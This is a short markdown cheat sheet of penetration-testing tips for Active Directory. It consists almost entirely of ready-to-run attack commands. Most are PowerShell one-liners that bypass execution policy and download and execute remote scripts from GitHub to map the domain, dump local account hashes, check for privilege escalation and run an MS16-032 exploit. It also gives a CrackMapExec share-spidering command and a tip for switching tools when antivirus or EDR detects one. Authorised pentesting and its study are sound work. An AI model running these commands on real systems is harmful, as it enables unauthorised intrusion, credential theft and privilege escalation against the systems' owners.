# Pentest Tips

Some tips from a cybersecurity consultant in France.

## Pentest Active Directory

### AD Mapping

Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’);Invoke-BloodHound"
```

The tool give you a zip file, that you have to send to a Neo4j database. Start the Neo4j database :

```markdown
Import-Module .\Neo4j-Management.psd1
Invoke-Neo4j console
```

Then execute BloodHound.exe and import the zip file.


### Shares :

Dump all shares via CrackMapExec :

```markdown
cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
```

If CME is detected by AV/EDR, use PowerShell one-liner PowerView :

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"
```

Then, a lot of functionalities can be used. To find all domain shares :

```markdown
Find-DomainShare -CheckShareAccess
```

All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/

### PowerShell one-liners

Bloodhound : Using ingestors to collect the data and then send it to BloodHound.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound"
```

PowerDump : Dump all local accounts.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump"
```

PowerUp : Check for privilege escalation.

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks"
```

Sherlock : An old tool to find vulnerabilities on the host. Can be still interesting.

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Find-AllVulns"
```

To exploit one of those vulnerabilities via Sherlock, for example MS16-032 :

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Invoke-MS16-032"
```
